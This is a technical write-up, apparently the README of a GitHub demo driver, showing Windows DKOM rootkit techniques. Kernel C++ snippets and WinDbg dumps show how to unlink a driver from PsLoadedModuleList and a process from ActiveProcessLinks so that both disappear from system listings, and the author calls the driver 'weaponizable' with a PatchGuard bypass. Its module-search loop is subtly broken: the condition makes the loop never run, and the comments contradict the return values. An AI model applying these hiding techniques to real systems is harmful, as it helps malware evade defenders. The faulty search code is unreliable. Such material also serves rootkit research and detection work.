# Windows DKOM Demo

This is an implementation of a simple driver which modifies kernel data structures to remove itself from the `PsLoadedModuleList` structure. Disclaimer: PG protects against this. Weaponizanble by chaining with a PG bypass.

---

`PsLoadedModuleList`  is a global kernel object of type `_KLDR_DATA_TABLE_ENTRY`. It is the list head of a circular linked-list containing the loaded modules on the system. Example:

```
2: kd> ?PsLoadedModuleList
Evaluate expression: -8773737086640 = fffff805`34848150
2: kd> dt poi(fffff805`34848150) _KLDR_DATA_TABLE_ENTRY
DKOM_Demo!_KLDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0xffffd78d`4ee49340 - 0xfffff805`34848150 ]
   +0x010 ExceptionTable   : 0xfffff805`34911000 Void
   +0x018 ExceptionTableSize : 0x5e38c
   +0x020 GpValue          : (null) 
   +0x028 NonPagedDebugInfo : (null) 
   +0x030 DllBase          : 0xfffff805`34400000 Void
   +0x038 EntryPoint       : 0xfffff805`34997010 Void
   +0x040 SizeOfImage      : 0xab7000
   +0x048 FullDllName      : _UNICODE_STRING "\SystemRoot\system32\ntoskrnl.exe"
   +0x058 BaseDllName      : _UNICODE_STRING "ntoskrnl.exe"
   +0x068 Flags            : 0x8804000
   +0x06c LoadCount        : 0x8f
   +0x06e __Unused5        : 0x10
   +0x070 SectionPointer   : (null) 
   +0x078 CheckSum         : 0x979256
   +0x080 LoadedImports    : (null) 
   +0x088 PatchInformation : 0x00000000`00000001 Void
```

We can see that at information about the entry is offset to the actual `LIST_ENTRY` structure, which holds the addresses of the next and previous `_KLDR_DATA_TABLE_ENTRY` structures. If you're not familiar, `LIST_ENTRY` looks like this:

```
2: kd> dt _List_entry
ntdll!_LIST_ENTRY
   +0x000 Flink            : Ptr64 _LIST_ENTRY
   +0x008 Blink            : Ptr64 _LIST_ENTRY
```

As it turns out, each driver has access to it's `KLDR_DATA_TABLE_ENTRY` structure by its `DriverObject->DriverSection` member at offset `0x28`. Just for completeness' sake, the `DRIVER_OBJECT` structure looks like this:

```
2: kd> dt PDRIVER_OBJECT
DKOM_Demo!PDRIVER_OBJECT
Ptr64    +0x000 Type             : Int2B
   +0x002 Size             : Int2B
   +0x008 DeviceObject     : Ptr64 _DEVICE_OBJECT
   +0x010 Flags            : Uint4B
   +0x018 DriverStart      : Ptr64 Void
   +0x020 DriverSize       : Uint4B
   +0x028 DriverSection    : Ptr64 Void    //KLDR_DATA_TABLE_ENTRY            
   +0x030 DriverExtension  : Ptr64 _DRIVER_EXTENSION
   +0x038 DriverName       : _UNICODE_STRING
   +0x048 HardwareDatabase : Ptr64 _UNICODE_STRING
   +0x050 FastIoDispatch   : Ptr64 _FAST_IO_DISPATCH
   +0x058 DriverInit       : Ptr64     long 
   +0x060 DriverStartIo    : Ptr64     void 
   +0x068 DriverUnload     : Ptr64     void 
   +0x070 MajorFunction    : [28] Ptr64     long 
```

As such, one can simply access and traverse `PsLoadedModuleList` using this member of `DRIVER_OBJECT`. Additionally, directly hiding a module from the list is as simple as relinking the `LIST_ENTRY` structures surrounding the driver's:

```c++
PLIST_ENTRY PrevModule = ThisModule->Blink;
PLIST_ENTRY NextModule = ThisModule->Flink;

// Replace PrevModule Flink with NextModule's address;
PrevModule->Flink = NextModule;
// Replace NextModule Blink with PrevModule's address
NextModule->Blink = PrevModule;

// point target process to itself
ThisModule->Flink = ThisModule;
ThisModule->Blink = ThisModule;
```

And since you have access to the driver `KLDR_DATA_TABLE_ENTRY`, you can check your work:

```c++
NTSTATUS FindKernelModule(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING DriverName) {
	// Logic can be similarly used for finding the PsLoadedModuleList head. ntoskrnl.exe is always the head
	PKLDR_DATA_TABLE_ENTRY pThisModule = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PLIST_ENTRY KModEntry = { nullptr };
	PLIST_ENTRY FirstEntry = pThisModule->InLoadOrderLinks.Flink;

	// https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
	// Loop over the circular linked-list
	for (PLIST_ENTRY pListEntry = pThisModule->InLoadOrderLinks.Flink;
		(pListEntry != &pThisModule->InLoadOrderLinks) &
		(pThisModule->InLoadOrderLinks.Flink != FirstEntry);
		pListEntry = pListEntry->Flink)
	{
		// Search for the driver you're trying to hide
		PKLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
			pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (RtlEqualUnicodeString(DriverName, &pEntry->BaseDllName, true)) {
			// oops, you found it. 
			KModEntry = pListEntry;
			return STATUS_SUCCESS;
		}
	}

    // module was unlinked successfully
	return STATUS_UNSUCCESSFUL;
}
```

This same type of unlinking behavior can be used to hide a process. In kernel mode, a process can be looked up by its ID using `PsLookupProcessByProcessId`:

```c++
// turn the PID into an EPROCESS pointer
PEPROCESS Process;
status = PsLookupProcessByProcessId((HANDLE)data->pid, &Process);
if (!NT_SUCCESS(status))
	break;
```

Where PEPROCESS represent a pointer to an EPROCESS structure like this:
```
2: kd> dt _EPROCESS
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : Ptr64 Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
   +0x300 RundownProtect   : _EX_RUNDOWN_REF
   +0x308 Flags2           : Uint4B
... (truncated
```

With a pointer to the target process's EPROCESS structure in hand, it can be scanned for the `ActiveProcessLinks` member. Once this member is found, hiding the process is the exact same for hiding a driver process:

```c++
// get the ActiveProcesLinks address
auto CurrentListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset);

auto PrevListEntry = CurrentListEntry->Blink;
auto NextListEntry = CurrentListEntry->Flink;

// unlink the target process
PrevListEntry->Flink = NextListEntry;
NextListEntry->Blink = PrevListEntry;

// point target process to itself
CurrentListEntry->Flink = CurrentListEntry;
CurrentListEntry->Blink = CurrentListEntry;
```
On Windows 10 1901 build 18363, the `ActiveProcessLinks` member is located at offset 0x2f0. This offset changes between builds.

The full source for an example driver can be found [here](https://github.com/joshfinley/DKOM_Demo).

Of course, none of this is anything new: 

## References
- [blackbone implementation to find PsLoadedModuleList](https://github.com/DarthTon/Blackbone/blob/master/src/BlackBoneDrv/Loader.c)
- [all sorts of ways of finding module addresses](https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo)
- [another implementation of the same driver hiding functionality](https://vxug.fakedoma.in/papers/Hiding%20loaded%20driver%20with%20DKOM%20.txt)
- [the reference implementation for the process hiding functionality(https://vxug.fakedoma.in/papers/Hide%20process%20with%20DKOM%20without%20hardcoded%20offsets.txt)
